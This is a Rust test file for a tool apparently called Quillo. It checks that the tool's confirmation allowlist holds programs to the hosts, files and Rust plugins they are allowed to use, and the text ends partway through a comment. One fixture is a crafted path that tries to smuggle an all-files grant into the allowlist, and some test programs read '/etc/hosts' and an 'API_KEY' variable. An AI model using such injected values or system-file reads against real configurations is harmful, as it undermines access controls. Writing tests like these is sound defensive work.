//! Coverage of src/confirm.rs's lines that the full run at 7e5a9af left unrun (FEEDBACK83.md, Q-1300
//! to Q-1308: `quillo confirm`, the committed `quillo.confirmed`, the hold of a run to it, a Rust
//! file held to its SHA-256 and the reading of its code; coverage of feedback82-85; branch
//! feedback82-85). Each test asserts what a developer sees: the listing, the file written, the
//! message and exit code, the answer a held program gives.

mod support;

use std::io::{Read, Write};
use std::net::TcpListener;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};
use support::{port_in_log, send, temp_dir, Guard};

// ---- helpers, as tests/feedback82_85_c.rs has them ---------------------------------------------

/// A test's folder, removed with the record of what its machine built when the test ends.
struct Dir(PathBuf);

impl Drop for Dir {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.0);
        let _ = std::fs::remove_dir_all(record_dir(&self.0));
    }
}

impl std::ops::Deref for Dir {
    type Target = Path;
    fn deref(&self) -> &Path {
        &self.0
    }
}

fn dir(name: &str) -> Dir {
    Dir(temp_dir(&format!("cov8285-{}", name)))
}

/// Where a test's program keeps the record of what its machine built: beside its folder.
fn record_dir(dir: &Path) -> PathBuf {
    dir.with_file_name(format!("{}-built", dir.file_name().unwrap().to_string_lossy()))
}

const SECRET: &str = "test secret for the tests, 32 bytes or more";

/// `quillo` with `args` in `dir`, `vars` set, ended after `secs`: its exit code and what it wrote.
fn quillo_env(dir: &Path, args: &[&str], secs: u64, vars: &[(&str, &str)]) -> (Option<i32>, String) {
    let log = dir.join("cmd.log");
    let file = std::fs::File::create(&log).unwrap();
    let mut child = Command::new(env!("CARGO_BIN_EXE_quillo"))
        .args(args)
        .current_dir(dir)
        .env_remove("QUILLO_POLICY_PATH")
        .envs(vars.iter().copied())
        .env_remove("CARGO_TARGET_DIR")
        .env("QUILLO_BUILT_RECORD_DIR", record_dir(dir))
        .env("QUILLO_SECRET", SECRET)
        .stdin(Stdio::null())
        .stdout(file.try_clone().unwrap())
        .stderr(file)
        .spawn()
        .unwrap();
    let deadline = Instant::now() + Duration::from_secs(secs);
    let code = loop {
        if let Some(s) = child.try_wait().unwrap() {
            break s.code();
        }
        if Instant::now() > deadline {
            let _ = child.kill();
            let _ = child.wait();
            break None;
        }
        std::thread::sleep(Duration::from_millis(20));
    };
    let out = std::fs::read_to_string(&log).unwrap_or_default();
    let _ = std::fs::remove_file(&log);
    (code, out)
}

fn quillo(dir: &Path, args: &[&str]) -> (Option<i32>, String) {
    quillo_env(dir, args, 60, &[])
}

/// `quillo run main.qwe --port 0` in `dir` with `opts` and `vars`: the guard, the port, the log.
fn serve_env(dir: &Path, opts: &[&str], vars: &[(&str, &str)]) -> (Guard, u16, PathBuf) {
    let log = dir.join("run.log");
    let file = std::fs::File::create(&log).unwrap();
    let child = Command::new(env!("CARGO_BIN_EXE_quillo"))
        .args(["run", "main.qwe", "--port", "0"])
        .args(opts)
        .current_dir(dir)
        .env_remove("QUILLO_POLICY_PATH")
        .envs(vars.iter().copied())
        .env_remove("CARGO_TARGET_DIR")
        .env("QUILLO_BUILT_RECORD_DIR", record_dir(dir))
        .env("QUILLO_SECRET", SECRET)
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(file)
        .spawn()
        .unwrap();
    let mut g = Guard::new(child);
    let port = port_in_log(&mut g.0, &log, Duration::from_secs(60));
    (g, port, log)
}

fn serve(dir: &Path, opts: &[&str]) -> (Guard, u16, PathBuf) {
    serve_env(dir, opts, &[])
}

fn write(dir: &Path, name: &str, text: &str) {
    let p = dir.join(name);
    if let Some(d) = p.parent() {
        std::fs::create_dir_all(d).unwrap();
    }
    std::fs::write(p, text).unwrap();
}

fn read(p: &Path) -> String {
    std::fs::read_to_string(p).unwrap_or_default()
}

/// Waits up to `secs` for `log` to hold `what`.
fn log_has(log: &Path, what: &str, secs: u64) -> bool {
    let until = Instant::now() + Duration::from_secs(secs);
    loop {
        if read(log).contains(what) {
            return true;
        }
        if Instant::now() > until {
            return false;
        }
        std::thread::sleep(Duration::from_millis(20));
    }
}

/// A stand-in for another server: counts what connects to it.
fn other_server() -> (u16, Arc<AtomicUsize>) {
    let l = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = l.local_addr().unwrap().port();
    let seen = Arc::new(AtomicUsize::new(0));
    let s = seen.clone();
    std::thread::spawn(move || {
        for c in l.incoming().flatten() {
            s.fetch_add(1, Ordering::SeqCst);
            let mut c = c;
            c.set_read_timeout(Some(Duration::from_secs(2))).ok();
            let mut buf = [0u8; 4096];
            let _ = c.read(&mut buf);
            let _ = c.write_all(b"HTTP/1.1 200 OK\r\ncontent-length: 2\r\nconnection: close\r\n\r\nok");
        }
    });
    (port, seen)
}

fn sha256_hex(b: &[u8]) -> String {
    use sha2::Digest;
    sha2::Sha256::digest(b).iter().map(|x| format!("{:02x}", x)).collect()
}

/// Two UDP ports no one has now, not the same one.
fn free_udps() -> (u16, u16) {
    let (a, b) = (std::net::UdpSocket::bind("127.0.0.1:0").unwrap(), std::net::UdpSocket::bind("127.0.0.1:0").unwrap());
    (a.local_addr().unwrap().port(), b.local_addr().unwrap().port())
}

/// A line of `quillo confirm --list`: the words, the item, its lines.
fn list_line(word: &str, item: &str, lines: &str) -> String {
    format!("  {:<13} {:<40} {}\n", word, item, lines)
}

// ---- a terminal --------------------------------------------------------------------------------

/// `quillo` with `args` in `dir`, its stdin, stdout and stderr a terminal of the test's: what it
/// writes there is read on a thread of its own.
#[cfg(unix)]
struct Tty {
    child: std::process::Child,
    master: std::fs::File,
    out: Arc<Mutex<String>>,
}

#[cfg(unix)]
impl Tty {
    fn start(dir: &Path, args: &[&str]) -> Tty {
        let (mut master, mut slave) = (0, 0);
        // SAFETY: openpty fills in two descriptors; no names or settings are given.
        assert_eq!(unsafe { libc::openpty(&mut master, &mut slave, std::ptr::null_mut(), std::ptr::null_mut(), std::ptr::null_mut()) }, 0);
        use std::os::fd::FromRawFd;
        // SAFETY: each descriptor is this test's, and owned once.
        let (m, s) = unsafe { (std::fs::File::from_raw_fd(master), std::fs::File::from_raw_fd(slave)) };
        let child = Command::new(env!("CARGO_BIN_EXE_quillo"))
            .args(args)
            .current_dir(dir)
            .env_remove("QUILLO_POLICY_PATH")
            .env_remove("CARGO_TARGET_DIR")
            .env("QUILLO_BUILT_RECORD_DIR", record_dir(dir))
            .env("QUILLO_SECRET", SECRET)
            .stdin(s.try_clone().unwrap())
            .stdout(s.try_clone().unwrap())
            .stderr(s)
            .spawn()
            .unwrap();
        support::stop_with_tests(&child);
        let out = Arc::new(Mutex::new(String::new()));
        let (o, mut r) = (out.clone(), m.try_clone().unwrap());
        std::thread::spawn(move || {
            let mut buf = [0u8; 4096];
            while let Ok(n) = r.read(&mut buf) {
                if n == 0 {
                    break;
                }
                o.lock().unwrap().push_str(&String::from_utf8_lossy(&buf[..n]));
            }
        });
        Tty { child, master: m, out }
    }

    fn text(&self) -> String {
        self.out.lock().unwrap().clone()
    }

    /// Waits up to 30 s for `what`; whether it came.
    fn wait_for(&self, what: &str) -> bool {
        let until = Instant::now() + Duration::from_secs(30);
        while !self.text().contains(what) {
            if Instant::now() > until {
                return false;
            }
            std::thread::sleep(Duration::from_millis(20));
        }
        true
    }

    fn answer(&mut self, line: &str) {
        self.master.write_all(format!("{}\n", line).as_bytes()).unwrap();
    }

    /// Its exit code, within 30 s.
    fn exit(&mut self) -> Option<i32> {
        let until = Instant::now() + Duration::from_secs(30);
        loop {
            if let Some(s) = self.child.try_wait().unwrap() {
                return s.code();
            }
            if Instant::now() > until {
                let _ = self.child.kill();
                let _ = self.child.wait();
                return None;
            }
            std::thread::sleep(Duration::from_millis(20));
        }
    }

    /// The port a `quillo run` on it says it listens on, within 60 s.
    fn port(&self) -> u16 {
        let until = Instant::now() + Duration::from_secs(60);
        loop {
            let text = self.text();
            if let Some(p) = text.split('\n').filter_map(|l| support::port_said(l.trim_end_matches('\r'))).next() {
                return p;
            }
            assert!(Instant::now() < until, "no port said:\n{}", text);
            std::thread::sleep(Duration::from_millis(20));
        }
    }
}

#[cfg(unix)]
impl Drop for Tty {
    fn drop(&mut self) {
        let _ = self.child.kill();
        let _ = self.child.wait();
    }
}

// ---- quillo confirm's own options and refusals -------------------------------------------------

/// `quillo confirm --help` prints the usage; an option it does not have, a program that is not a
/// file and a `quillo.confirmed` it cannot read stop it with 2; `--effects` goes on past a file it
/// cannot read, and exits 2 (src/confirm.rs main and effects_command, FEEDBACK83.md Q-1300 and
/// Q-1306; coverage of feedback82-85; branch feedback82-85).
#[test]
fn confirm_says_its_usage_and_stops_on_what_it_cannot_take() {
    let d = dir("usage");
    // (Said by `quillo`'s own reading of -h before the command runs: confirm::main's own answer to
    // it is not reached from the command line.)
    let (code, out) = quillo(&d, &["confirm", "--help"]);
    assert_eq!(code, Some(0), "{}", out);
    assert!(out.starts_with("usage:\n  quillo confirm [<file.qwe>] [PATH...]") && out.contains("--effects FILE..."), "{}", out);
    // -h anywhere, as --help.
    assert!(quillo(&d, &["confirm", "main.qwe", "-h"]).1.starts_with("usage:"));
    let (code, out) = quillo(&d, &["confirm", "--yess"]);
    assert_eq!(code, Some(2), "{}", out);
    assert!(out.starts_with("quillo confirm: unknown option `--yess`\nusage:"), "{}", out);
    // No main.qwe here, and a named program that is not there.
    let (code, out) = quillo(&d, &["confirm"]);
    assert_eq!(code, Some(2), "{}", out);
    assert!(out.contains("quillo confirm: no program: main.qwe is not a file (name the main .qwe file first)"), "{}", out);
    let (code, out) = quillo(&d, &["confirm", "app.QWE"]);
    assert_eq!(code, Some(2), "{}", out);
    assert!(out.contains("no program: app.QWE is not a file"), "{}", out);
    // A folder named like a program is not one.
    std::fs::create_dir_all(d.join("dir.qwe")).unwrap();
    assert_eq!(quillo(&d, &["confirm", "dir.qwe"]).0, Some(2));
    // A quillo.confirmed that does not parse, or is a folder: said, nothing written.
    write(&d, "main.qwe", "route GET / = http.get(\"https://api.example.com/x\").status ?? 0\n");
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\nhosts = [\"api.example.com\"]\n");
    let (code, out) = quillo(&d, &["confirm", "--yes"]);
    assert_eq!(code, Some(2), "{}", out);
    assert!(out.contains("quillo confirm: ./quillo.confirmed: line 2: `hosts` is not something quillo.confirmed says"), "{}", out);
    assert_eq!(read(&d.join("quillo.confirmed")), "[\"main.qwe\"]\nhosts = [\"api.example.com\"]\n");
    std::fs::remove_file(d.join("quillo.confirmed")).unwrap();
    std::fs::create_dir_all(d.join("quillo.confirmed")).unwrap();
    let (code, out) = quillo(&d, &["confirm", "--yes"]);
    assert_eq!(code, Some(2), "{}", out);
    assert!(out.contains("quillo confirm: ./quillo.confirmed: "), "{}", out);
    assert!(d.join("quillo.confirmed").is_dir());
    // --effects: a file it cannot read is said, the next one still read, and the exit is 2.
    write(&d, "ok.qwer", "//! version: 1.0.0\n//! effects: fs\npub fn a() -> String { std::fs::read_to_string(\"x\").unwrap_or_default() }\n");
    let (code, out) = quillo(&d, &["confirm", "--effects", "gone.qwer", "ok.qwer"]);
    assert_eq!(code, Some(2), "{}", out);
    assert!(out.contains("quillo confirm: cannot read gone.qwer") && out.contains("ok.qwer: effects: fs\n"), "{}", out);
}

// ---- quillo.confirmed's text, read and written --------------------------------------------------

/// What `quillo check` says of a `quillo.confirmed` written by hand at the edges of its form: a
/// block named without quotes is read, an empty name, a second text, words after a list and a
/// text that does not end are refused with their lines (src/confirm.rs parse and unquote,
/// FEEDBACK83.md Q-1300; coverage of feedback82-85; branch feedback82-85).
#[test]
fn a_hand_written_file_is_read_at_the_edges_of_its_form() {
    let d = dir("parse");
    write(&d, "main.qwe", "route GET / = http.get(\"https://api.example.com/x\").status ?? 0\n");
    let check = |text: &str| {
        write(&d, "quillo.confirmed", text);
        quillo(&d, &["check", "main.qwe"])
    };
    // A block named bare, as TOML would not take it: still the file's.
    let (code, out) = check("[main.qwe]\nhttp = [\"api.example.com\"]\n");
    assert_eq!(code, Some(0), "{}", out);
    // Bare and quoted are the same block; a name with spaces round it is trimmed.
    assert_eq!(check("[ main.qwe ]\nhttp = [\"api.example.com\"]\n").0, Some(0));
    // A block that names no file, quoted or not.
    for text in ["[\"\"]\n", "[]\n", "[  ]\n"] {
        let (code, out) = check(text);
        assert_eq!(code, Some(1), "{}", out);
        assert!(out.contains("quillo.confirmed: line 1: a file's block names its file"), "{:?}: {}", text, out);
    }
    let hash = "a".repeat(64);
    let (code, out) = check(&format!("[\"main.qwe\"]\nhttp = [\"api.example.com\"]\n\n[\"p.qwer\"]\nsha256 = \"{}\" \"{}\"\n", hash, hash));
    assert_eq!(code, Some(1), "{}", out);
    assert!(out.contains("quillo.confirmed: line 5: one text after `=`"), "{}", out);
    // A comment after the text is no second one.
    assert_eq!(check(&format!("[\"main.qwe\"]\nhttp = [\"api.example.com\"]\n[\"p.qwer\"]\nsha256 = \"{}\" # pinned\n", hash)).0, Some(0));
    // A second list after the first, on its line.
    let (code, out) = check("[\"main.qwe\"]\nhttp = [\"api.example.com\"], [\"b.example\"]\n");
    assert_eq!(code, Some(1), "{}", out);
    assert!(out.contains("quillo.confirmed: line 2: nothing after a list but a comment"), "{}", out);
    // Words after it that do not end at a `]` are read as the list going on, to the file's end.
    let (code, out) = check("[\"main.qwe\"]\nhttp = [\"api.example.com\"] and more\n");
    assert_eq!(code, Some(1), "{}", out);
    assert!(out.contains("quillo.confirmed: line 2: a list that does not end"), "{}", out);
    // A text that does not end, at the list's end and at a `\` that ends the line.
    for text in ["[\"main.qwe\"]\nhttp = [\"api.example.com]\n", "[\"main.qwe\"]\nhttp = [\"api.example.com\\\"]\n"] {
        let (code, out) = check(text);
        assert_eq!(code, Some(1), "{}", out);
        assert!(out.contains("quillo.confirmed: line 2: `http` is a list of texts"), "{:?}: {}", text, out);
    }
    // A block whose quoted name does not end is named by what is written, and is not main.qwe's.
    let (code, out) = check("[\"main.qwe]\nhttp = [\"api.example.com\"]\n");
    assert_eq!(code, Some(1), "{}", out);
    assert!(out.contains("main.qwe:1: error: reaches api.example.com: not confirmed for this file"), "{}", out);
}

/// Texts with `"`, `\`, a tab, a newline and `#` are written escaped and read back as they were:
/// a path a program names cannot write a block of its own into the file (src/confirm.rs quote,
/// unquote and uncommented, FEEDBACK83.md Q-1300; coverage of feedback82-85; branch
/// feedback82-85).
#[test]
fn a_text_with_quotes_and_newlines_is_written_escaped_and_read_back() {
    let d = dir("quote");
    write(
        &d,
        "main.qwe",
        "use kit/k.qwe\nroute GET /a = read_file(\"data/a\\\"b#c.txt\") ?? \"refused\"\nroute GET /b = read_file(\"data/t\\tn.txt\") ?? \"refused\"\nroute GET /c = read_file(\"data/back\\\\slash.txt\") ?? \"refused\"\nroute GET /d = read_file(\"data/x\\n[\\\"kit/k.qwe\\\"]\\nfiles = [\\\"/\\\"]\\n\") ?? \"refused\"\nroute GET /k = k()\n",
    );
    write(&d, "kit/k.qwe", "fn k() = read_file(\"/etc/hosts\") ?? \"refused\"\n");
    write(&d, "data/a\"b#c.txt", "quote");
    write(&d, "data/t\tn.txt", "tab");
    write(&d, "data/back\\slash.txt", "backslash");
    // Only main.qwe: kit/k.qwe stays confirmed for nothing.
    let (code, out) = quillo(&d, &["confirm", "main.qwe", "main.qwe", "--yes"]);
    assert_eq!(code, Some(1), "{}", out);
    let text = read(&d.join("quillo.confirmed"));
    assert!(
        text.contains("files = [\"data/a\\\"b#c.txt\", \"data/back\\\\slash.txt\", \"data/t\\tn.txt\", \"data/x\\n[\\\"kit/k.qwe\\\"]\\nfiles = [\\\"/\\\"]\\n\"]\n"),
        "{}",
        text
    );
    // One line for the list: the newline in the path is `\n`, no block of its own.
    assert!(!text.contains("\n[\"kit/k.qwe\"]"), "{}", text);
    assert_eq!(text.lines().filter(|l| l.starts_with('[')).count(), 1, "{}", text);
    // Read back the same: main.qwe's reads are confirmed, kit/k.qwe's is not.
    let (code, out) = quillo(&d, &["check", "main.qwe"]);
    assert_eq!(code, Some(1), "{}", out);
    assert!(out.contains("kit/k.qwe:1: error: reads /etc/hosts: not confirmed for this file"), "{}", out);
    assert!(!out.contains("main.qwe:"), "{}", out);
    let (g, port, _) = serve(&d, &[]);
    assert_eq!(send(port, "GET", "/a", &[], "").body, "quote");
    assert_eq!(send(port, "GET", "/b", &[], "").body, "tab");
    assert_eq!(send(port, "GET", "/c", &[], "").body, "backslash");
    assert_eq!(send(port, "GET", "/k", &[], "").body, "refused");
    drop(g);
    // Only kit/ confirmed now: main.qwe's block is written again from what was read, the same.
    write(&d, "kit/k.qwe", "fn k() = read_file(\"data/k.txt\") ?? \"refused\"\n");
    let (code, out) = quillo(&d, &["confirm", "main.qwe", "kit/", "--yes"]);
    assert_eq!(code, Some(0), "{}", out);
    assert_eq!(read(&d.join("quillo.confirmed")), text.replacen("\n[\"main.qwe\"]", "\n[\"kit/k.qwe\"]\nfiles = [\"data/k.txt\"]\n\n[\"main.qwe\"]", 1));
}

// ---- the scan ----------------------------------------------------------------------------------

/// `quillo confirm --list` reads a call given its address by a pipe, a `save:` path, both of
/// `image.convert`'s paths, a component's default address, a database's written hosts but not
/// one worked out, nor a template that starts with a value; each file once, a Rust file taken
/// twice too (src/confirm.rs scan_from, read_calls, read_call, written_start, origin_host,
/// FEEDBACK83.md Q-1300; coverage of feedback82-85; branch feedback82-85).
#[test]
fn the_scan_reads_pipes_saves_and_defaults_and_each_file_once() {
    let d = dir("scan");
    write(
        &d,
        "main.qwe",
        r#"use lib/a.qwe
use lib/b.qwe
import hi.qwer use hi
/// A tool of the program's own.
fn mcp own() -> str = "own"
component Map(tiles = "https://tile.example:8443/{z}.png") { <img src={tiles} alt=""/> }
component Ping() { <button onclick={() => js("fetch", "https://./y")}>p</button> }
let base = "https://api.example.com"
let o = { inner: { f: () => 1 } }
let opts = { video: 5004, host: "0.0.0.0" }
route GET /p = "https://piped.example/x" | http.get()
route GET /t = http.get(`${base}/x`)
route writes GET /s = http.get("https://dl.example/f.bin", { save: "downloads/f.bin" })
route writes GET /c = image.convert("in/a.png", "out/a.webp")
route GET /d = db.open("postgres://app@" + request.query.h + "/app")
route GET /r = db.open("postgres://app@db1.example/app", { replicas: ["postgres://app@" + request.query.h + "/app", "postgres://app@db2.example/app"] })
route writes GET /f = db.open("data/x.db", {})
route GET /m = media.rtp("cam", opts)
route GET /n = o.inner.f() + (() => 1)() + a() + b()
route GET /h = <html><body><Map/><Ping/>{hi()}</body></html>
"#,
    );
    write(&d, "lib/a.qwe", "use lib/common.qwe\nimport hi.qwer use hi\nfn a() = common() + len(hi())\n");
    write(&d, "lib/b.qwe", "use lib/common.qwe\nfn b() = common()\n");
    write(&d, "lib/common.qwe", "fn common() = 1\n");
    let hi = "//! version: 1.0.0\n//! effects: none\npub fn hi() -> String { \"hi\".into() }\n";
    write(&d, "hi.qwer", hi);
    let (code, out) = quillo(&d, &["check", "main.qwe"]);
    assert_eq!(code, Some(0), "{}", out);
    let (code, out) = quillo(&d, &["confirm", "--list"]);
    assert_eq!(code, Some(0), "{}", out);
    let mut want = format!("hi.qwer\n  sha256        {}\n  says effects  none\n  reads as      none\nmain.qwe\n", sha256_hex(hi.as_bytes()));
    for (word, item, line) in [
        ("reaches", "db1.example", "16"),
        ("reaches", "db2.example", "16"),
        ("reaches", "dl.example", "13"),
        ("reaches", "piped.example", "11"),
        ("reads", "in/a.png", "14"),
        ("writes", "data/x.db", "17"),
        ("writes", "downloads/f.bin", "13"),
        ("writes", "out/a.webp", "14"),
        ("page loads", "tile.example:8443", "6"),
    ] {
        want.push_str(&list_line(word, item, line));
    }
    assert_eq!(out, want);
    // Confirmed whole: the Rust file's block once, the library each file takes once; nothing of a
    // worked-out database, a template that starts with a value, an RTP port in a variable, an
    // address with no host.
    let (code, out) = quillo(&d, &["confirm", "--yes"]);
    assert_eq!(code, Some(0), "{}", out);
    let text = read(&d.join("quillo.confirmed"));
    assert_eq!(text.matches("[\"hi.qwer\"]").count(), 1, "{}", text);
    for not in ["api.example.com", "udp 5004", "lib/common.qwe", "calls", "\"\""] {
        assert!(!text.contains(not), "{} in {}", not, text);
    }
    assert!(text.contains("http = [\"db1.example\", \"db2.example\", \"dl.example\", \"piped.example\"]"), "{}", text);
}

/// A Rust file a program takes that is not there yet is listed for nothing; added after the
/// program was confirmed, it stops the start until it is confirmed too (src/confirm.rs
/// scan_from's Rust file it cannot read, at_start; FEEDBACK83.md Q-1300; coverage of
/// feedback82-85; branch feedback82-85).
#[test]
fn a_rust_file_added_after_confirming_stops_the_start() {
    let d = dir("late");
    write(&d, "main.qwe", "import late.qwer use late\nroute GET / = late()\nroute GET /a = http.get(\"https://api.example.com/\").status ?? 0\n");
    let (code, out) = quillo(&d, &["confirm", "--list"]);
    assert_eq!(code, Some(0), "{}", out);
    assert_eq!(out, format!("main.qwe\n{}", list_line("reaches", "api.example.com", "3")));
    let (code, out) = quillo(&d, &["confirm", "--yes"]);
    assert_eq!(code, Some(0), "{}", out);
    assert!(!read(&d.join("quillo.confirmed")).contains("late.qwer"));
    let late = "//! version: 1.0.0\n//! effects: none\npub fn late() -> String { \"late\".into() }\n";
    write(&d, "late.qwer", late);
    let (code, out) = quillo_env(&d, &["run", "main.qwe", "--port", "0"], 60, &[]);
    assert_eq!(code, Some(1), "{}", out);
    assert!(out.contains(&format!("late.qwer is not confirmed (its SHA-256 is {}); Rust cannot be held to a list, so it does not load", sha256_hex(late.as_bytes()))), "{}", out);
    assert!(!d.join(".quillo/native").exists());
}

// ---- a Rust file's reading ---------------------------------------------------------------------

/// A plugin whose header has a blank line among its dependencies, with a block comment over three
/// lines that nests, a `'\"'` character and a written address: read for fs at its true line, env,
/// the address and path it writes, and http by its crate, and never `run` from the comment; listed
/// so by `quillo confirm` and `--list` (src/confirm.rs rust_code, scan_rust, listing,
/// whole_listing; FEEDBACK83.md Q-1305; coverage of feedback82-85; branch feedback82-85).
#[test]
fn a_rust_files_reading_is_listed_with_what_it_writes() {
    let d = dir("rust");
    let reach = "//! Reaches out.
//! version: 1.0.0
//! effects: none
//!
//! [dependencies]
//! ureq = \"2\"
//!
//! serde = { version = \"1\" }

/* A note, over
   three lines, with /* a nested std::process::Command */ still a comment
*/
pub fn reach() -> String {
    let q = '\\\"';
    let hosts = std::fs::read_to_string(\"/etc/hosts\").unwrap_or_default();
    let key = std::env::var(\"API_KEY\").unwrap_or_default();
    let url = \"https://api.example.com/v1\";
    format!(\"{}{}{}{}\", q, hosts.len(), key, url)
}
";
    assert!(reach.contains("let q = '\\\"';"));
    write(&d, "reach.qwer", reach);
    write(&d, "main.qwe", "import reach.qwer use reach\nroute GET / = reach()\n");
    let hash = sha256_hex(reach.as_bytes());
    let note = "`effects: none`, and calls std::fs::read_to_string (line 15), std::env::var (line 16), the crate ureq: a reading of its text, not a proof (a crate can do what it does unseen)";
    let (code, out) = quillo(&d, &["confirm"]);
    assert_eq!(code, Some(1), "{}", out);
    let listed = format!(
        "quillo: 1 file reaches something not confirmed yet\n  reach.qwer  (Rust: Quillo cannot hold it to a list, only to this file)\n    file          sha256 {}\n    says          effects: none\n    reads as      http, fs, env\n    written       /etc/hosts, api.example.com\n    but           {}\n",
        hash, note
    );
    assert!(out.starts_with(&listed), "{}", out);
    let (code, out) = quillo(&d, &["confirm", "--list"]);
    assert_eq!(code, Some(0), "{}", out);
    assert_eq!(
        out,
        format!("reach.qwer\n  sha256        {}\n  says effects  none\n  reads as      http, fs, env\n  written       /etc/hosts, api.example.com\n  env           API_KEY\n  crates        serde 1, ureq 2\n  note: says {}\n", hash, note)
    );
    let (code, out) = quillo(&d, &["confirm", "--effects", "reach.qwer"]);
    assert_eq!(code, Some(1), "{}", out);
    assert!(out.starts_with("reach.qwer: effects: http, fs, env\n") && !out.contains("run"), "{}", out);
    // A block comment that ends at once, and one character escaped another way: the lines hold.
    write(&d, "two.qwer", "//! version: 1.0.0\n//! effects: none\n/**/ pub fn a() -> char {\n    let _ = std::fs::read(\"x\");\n    '\\n'\n}\npub fn b() { let _ = std::net::TcpStream::connect(\"h:1\"); }\n");
    let (code, out) = quillo(&d, &["confirm", "--effects", "two.qwer"]);
    assert_eq!(code, Some(1), "{}", out);
    assert!(out.contains("calls std::fs::read (line 4), std::net::TcpStream::connect (line 7)"), "{}", out);
}

// ---- the file kept as it was -------------------------------------------------------------------

/// A block for a file the program no longer takes leaves at the next `quillo confirm`, said as an
/// item no longer there; a confirmed script keeps its integrity hash when its file is confirmed
/// again, with nothing fetched (src/confirm.rs stale, merged; FEEDBACK83.md Q-1300 D.3 and Q-1304;
/// coverage of feedback82-85; branch feedback82-85).
#[test]
fn a_block_no_longer_taken_leaves_and_a_script_keeps_its_hash() {
    let d = dir("stale");
    write(
        &d,
        "main.qwe",
        "client \"https://cdn.example/x.js\" use X\ncomponent C() { <b onclick={() => X.go()}>c</b> }\nroute GET / = <html><body><C/></body></html>\nroute GET /n = http.get(\"https://new.example/\").status ?? 0\n",
    );
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\nscripts = [\"https://cdn.example/x.js sha384-abc\"]\n\n[\"old.qwe\"]\nhttp = [\"gone.example\"]\n\n[\"empty.qwe\"]\n");
    let (code, out) = quillo(&d, &["check", "main.qwe"]);
    assert_eq!(code, Some(1), "{}", out);
    assert!(out.contains("main.qwe:4: error: reaches new.example"), "{}", out);
    // main.qwe confirmed again: its script's hash kept, not fetched; the other blocks left.
    let (code, out) = quillo(&d, &["confirm", "--yes"]);
    assert_eq!(code, Some(0), "{}", out);
    assert!(!out.contains("could not be fetched") && !out.contains("no longer"), "{}", out);
    let text = read(&d.join("quillo.confirmed"));
    assert!(text.contains("[\"main.qwe\"]\nhttp = [\"new.example\"]\nscripts = [\"https://cdn.example/x.js sha384-abc\"]\n"), "{}", text);
    assert!(text.contains("[\"old.qwe\"]\nhttp = [\"gone.example\"]"), "{}", text);
    // Nothing left to confirm: the block of a file no longer taken leaves, and is said.
    let (code, out) = quillo(&d, &["confirm"]);
    assert_eq!(code, Some(0), "{}", out);
    assert!(out.contains("quillo: 1 item no longer in the files left quillo.confirmed\n"), "{}", out);
    let text = read(&d.join("quillo.confirmed"));
    assert!(!text.contains("old.qwe") && !text.contains("empty.qwe") && text.contains("sha384-abc"), "{}", text);
    // Once gone, nothing more to say.
    let (code, out) = quillo(&d, &["confirm"]);
    assert_eq!(code, Some(0), "{}", out);
    assert!(!out.contains("no longer"), "{}", out);
}

/// A `quillo.confirmed` that is a symbolic link is read, but never written through: `quillo
/// confirm` says so and leaves the file it leads to as it was, whether it would add what is
/// missing or take out a block no longer taken (src/confirm.rs write, main; FEEDBACK83.md Q-1300;
/// coverage of feedback82-85; branch feedback82-85).
#[cfg(unix)]
#[test]
fn a_file_that_is_a_link_is_never_written_through() {
    let d = dir("link");
    write(&d, "main.qwe", "route GET / = http.get(\"https://api.example.com/x\").status ?? 0\n");
    write(&d, "kept/real.confirmed", "[\"main.qwe\"]\n");
    std::os::unix::fs::symlink("kept/real.confirmed", d.join("quillo.confirmed")).unwrap();
    let (code, out) = quillo(&d, &["confirm", "--yes"]);
    assert_eq!(code, Some(1), "{}", out);
    assert!(out.contains("quillo confirm: ./quillo.confirmed is a symbolic link: nothing written"), "{}", out);
    assert_eq!(read(&d.join("kept/real.confirmed")), "[\"main.qwe\"]\n");
    assert!(std::fs::symlink_metadata(d.join("quillo.confirmed")).unwrap().file_type().is_symlink());
    // Read through the link: check holds the program to what it says.
    let (code, out) = quillo(&d, &["check", "main.qwe"]);
    assert_eq!(code, Some(1), "{}", out);
    assert!(out.contains("reaches api.example.com: not confirmed"), "{}", out);
    // All confirmed, with a block no longer taken to take out: still not written.
    write(&d, "kept/real.confirmed", "[\"main.qwe\"]\nhttp = [\"api.example.com\"]\n\n[\"old.qwe\"]\nhttp = [\"gone.example\"]\n");
    let (code, out) = quillo(&d, &["confirm"]);
    assert_eq!(code, Some(1), "{}", out);
    assert!(out.contains("quillo confirm: ./quillo.confirmed is a symbolic link: nothing written"), "{}", out);
    assert!(read(&d.join("kept/real.confirmed")).contains("old.qwe"));
    assert!(!std::fs::read_dir(&*d).unwrap().flatten().any(|e| e.file_name().to_string_lossy().ends_with(".part")));
}

/// Where the new file cannot take the old one's place (it is locked), `quillo confirm` says why,
/// takes its half-written copy away and leaves the old file as it was (src/confirm.rs write;
/// FEEDBACK83.md Q-1300; coverage of feedback82-85; branch feedback82-85). macOS: a user can lock
/// a file of their own (`chflags uchg`); Linux needs root to.
#[cfg(target_os = "macos")]
#[test]
fn a_file_that_cannot_be_replaced_is_left_as_it_was() {
    struct Unlock(PathBuf);
    impl Drop for Unlock {
        fn drop(&mut self) {
            let _ = Command::new("chflags").arg("nouchg").arg(&self.0).status();
        }
    }
    let d = dir("locked");
    write(&d, "main.qwe", "route GET / = http.get(\"https://api.example.com/x\").status ?? 0\n");
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\n");
    let file = d.join("quillo.confirmed");
    assert!(Command::new("chflags").arg("uchg").arg(&file).status().unwrap().success());
    let _unlock = Unlock(file.clone());
    let (code, out) = quillo(&d, &["confirm", "--yes"]);
    assert_eq!(code, Some(1), "{}", out);
    assert!(out.contains("quillo confirm: ./quillo.confirmed: Operation not permitted"), "{}", out);
    assert_eq!(read(&file), "[\"main.qwe\"]\n");
    assert!(!std::fs::read_dir(&*d).unwrap().flatten().any(|e| e.file_name().to_string_lossy().ends_with(".part")));
}

// ---- asked at a terminal -----------------------------------------------------------------------

/// `quillo run` at a terminal lists what is not confirmed and asks: `y` writes it and the program
/// runs held to it, reaching what was confirmed; `n` runs it with each refused; a file that is a
